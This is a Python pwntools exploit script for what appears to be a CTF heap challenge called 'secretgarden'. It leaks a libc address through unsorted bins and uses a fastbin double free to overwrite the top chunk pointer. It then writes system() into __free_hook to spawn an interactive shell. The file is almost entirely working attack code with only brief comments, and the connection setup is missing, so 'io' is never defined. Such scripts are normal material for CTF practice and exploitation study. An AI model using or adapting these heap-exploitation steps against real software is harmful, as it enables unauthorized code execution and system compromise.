from pwn import *
#io = process('./secretgarden', env = {'LD_PRELOAD' : './libc_64.so.6'})
l = ELF('./libc_64.so.6')

context.log_level = 'info'

def menu(ch):
    io.recvuntil('Your choice : ')
    io.sendline(str(ch))

def flower(name, color, length = 0):
    menu(1)
    io.recvuntil('Length of the name :')
    if length:
        io.sendline(str(length))
    else:
        io.sendline(str(len(name)))
    io.recvuntil('The name of flower :')
    if length:
    	io.sendline(name)
    else:
	io.send(name)
    io.recvuntil('The color of the flower :')
    io.sendline(color)
    
def remove(idx):
    menu(3)
    io.recvuntil('Which flower do you want to remove from the garden:')
    io.sendline(str(idx))

#leak libc address with unsorted bins
flower('a' * 0x1f0 + p64(0x30) + 'a' * 8, 'A' * 23) # 0
flower('b' * 0x200, 'B' * 23) # 1
remove(1)
remove(0)
flower('', 'C' * 23, 0x100) # 2
menu(2) #visit
io.recvuntil('[2] :')
libc_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
libc_addr = libc_addr - 0xa
log.info('libc_addr :' + hex(libc_addr))
remove(2)
menu(4) #clean

libc_main = libc_addr - (l.symbols['__malloc_hook'] - 0x10)
log.info('libc_main :' + hex(libc_main))
'''
#leak heap address
flower('a', 'A' * 23) #0
flower('b', 'B' * 23) #1
remove(1)
remove(0)
flower('', 'C' * 23) #2
menu(2) #visit
io.recvuntil('[2] :')
heap_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
log.info('heap_addr :' + hex(heap_addr))
remove(2)
menu(4) #clean
'''
# make a dup into libc attack
flower('a' * 0x60, 'A' * 23) # 0
flower('b' * 0x60, 'B' * 23) # 1

# fastbin is LIFO
remove(1) # malloced as name chunk
remove(0) # malloced as control chunk 
remove(1) # malloced as name chunk
#malloc the first three
flower(p64(libc_addr - 0x20 + 0xd) + 'e' * 0x58, 'E' * 23) # 2 
flower('f' * 0x60, 'F' * 23) #3
flower('g' * 0x60, 'G' * 23) #4
#next malloc will be the chunk on libc
payload  = '\x00'*3 + 3 * p64(0)
payload += p64(0x71)
payload = payload.ljust(0x60, '\x00')
flower(payload, 'H' * 23) #5
#do it again to set the <main_arena + 88>
remove(1)
remove(0)
remove(1)
flower(p64(libc_addr + 0x10) + 'i' * 0x58, 'I' * 23) #6
flower('/bin/sh\x00'.ljust(0x60, 'j'), 'J' * 23) #7 put /bin/sh on heap
flower('k' * 0x60, 'K' * 23) #8

#over write the top_chunk pointer in libc_addr + 88
flower(p64(0) * 11 + p64(libc_main + l.symbols['__free_hook'] - 2904), 'J') #9

#now the malloc will be in new top chunks, we just need to calculate the right malloc_size to free_hook
#and because of the sucks IO, we need to malloc carefully, small chunk by small chunk
#and there are IO about variables before __free_hook, we should set it all NULL, other wise the read will be stucked
#at <__lll_lock_wait_private+28>

for i in range(0, 3):
    flower('\x00' * 0x300, '1')
system_libc = libc_main + l.symbols['system']
log.info('system :' + hex(system_libc))
flower('\x00' * 0x158 + p64(system_libc), '2')

#do the free manually to get the remote shell
io.interactive()
